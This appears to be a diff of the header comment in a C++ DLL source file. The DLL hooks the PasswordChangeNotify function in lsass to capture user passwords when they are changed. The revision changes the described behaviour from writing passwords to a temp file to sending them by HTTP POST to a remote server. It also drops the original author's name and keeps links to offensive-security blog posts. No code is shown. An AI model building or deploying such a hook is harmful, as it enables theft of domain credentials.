@@ -2,16 +2,15 @@
 //
 
 /*
-	This should only be compiled as X64 preferrable Release mode only. This DLL will hook the PasswordChangeNotify function in rassfm.dll (in lsass).
-	Any time a user changes their password, it will get written to c:\windows\temp\passwords.txt
-
+	The tool implements permission persistence through HOOK PasswordChangeNotify. Modified based on the original HookPasswordChange to add a simple 
+	HTTP request functionality via the WinINet API. When the administrator modifies the password, the user password will be transmitted to the remote 
+	server via the HTTP POST method.
+	
 	Please see my blog at clymb3r.wordpress.com for more information.
 
-	Author: Joe Bialek
-	Twitter: @JosephBialek
-	Blog about this project: http://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/
-
-	Inspiration: http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html
+	http://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/
+	http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html
+	https://github.com/clymb3r/Misc-Windows-Hacking
 */
 
 #include "pch.h"
